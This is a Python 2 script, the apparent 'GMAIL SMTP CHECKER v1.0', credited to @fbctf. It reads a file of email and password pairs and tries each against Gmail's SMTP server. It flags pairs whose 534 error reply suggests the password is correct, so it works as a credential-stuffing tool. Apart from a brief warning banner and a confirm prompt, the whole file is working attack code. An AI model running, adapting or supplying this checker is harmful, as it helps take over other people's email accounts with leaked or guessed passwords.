import os
import sys
import smtplib
import optparse
import time
import tqdm

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    warning = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def main() :
	if __name__ == '__main__':
		parser = optparse.OptionParser("usage: python smtpchecker.py -t smtp.gmail.com -p 587 -f path/passwords.txt")
		parser.add_option("-t", "--host", dest="hostname", default="127.0.0.1", type="string", help="specify hostname to run on")
		parser.add_option("-p", "--port", dest="port", default="587", type="int", help="specify port to run on")
		parser.add_option("-f", "--file", dest="filename", help="Enter the comma-separated file with email and password")
		(options, args) = parser.parse_args()

		if len(args) > 4:
			parser.error("Incorrect number of arguments")
	host = options.hostname
	port = options.port
	file = options.filename

	files = open(file, "r")
	lines = files.readlines()

	

	

	count = 0

	print("""      
						
       .-. \_/ .-. 		
       \.-\/=\/.-/ 	           
    '-./___|=|___\.-'    GMAIL SMTP CHECKER v1.0
   .--| \|/`"`\|/ |--.	 Do forget not be evil. 
  (((_)\  .---.  /(_)))   
   `\ \_`-.   .-'_/ /`_   
     '.__       __.'(_))
         /  FB  \     //
        |       |__.'/
        \       /--'`
    .--,-' .--. '----.
   '----`--'  '--`----'
     By @fbctf 
     https://twitter.com/fbctf
	""")


	print bcolors.warning + "Warning: This can be dangerous and illegal!" + bcolors.ENDC

	while True:
		answer = raw_input("Do you wish to continue? (Y/n): ")

		if answer == "y" or answer == "Y" :
			print  bcolors.warning + "[+] Is at its own risk..." + bcolors.ENDC
		 	break
		elif answer == "n" or answer == "N" :
			sys.exit("Don't be evil")
		else :
			sys.exit("Argument is not valid.")

	def sleeper():

		r = []

		for count, line in enumerate(tqdm.tqdm(lines)):
		 	
		 	time.sleep(0)

		 	k = map(str.strip, lines)
			v = k[count].find(",")
			e = k[count][0:v]
			p = k[count][v+1:] 

			try:
		            server = smtplib.SMTP(host, port)
		            server.ehlo()
		            server.starttls()
		            authorized = server.login(e, p) 

		            if authorized:
		            	print "[+] Password found less secure applications enabled."
		            else :
		            	print "[+] Password not found "

		        except smtplib.SMTPResponseException, SMTPResponse:
		            if len(SMTPResponse[1]) > 510 and len(SMTPResponse[1]) \
		                < 516 and SMTPResponse[0] == 534:
		                r.append((e,p))
		if len(r) > 0:
			print bcolors.OKGREEN + "[+] Checking the results %s/%s passwords found."  % (len(lines), len(r) ) + bcolors.ENDC 
		else :
			print bcolors.FAIL + "[+] Checking the results %s Passwords found!!!"  % (len(r) ) + bcolors.ENDC 
		
		for results in r :
		  print results[0] + "," + results[1]
	sleeper()
main()
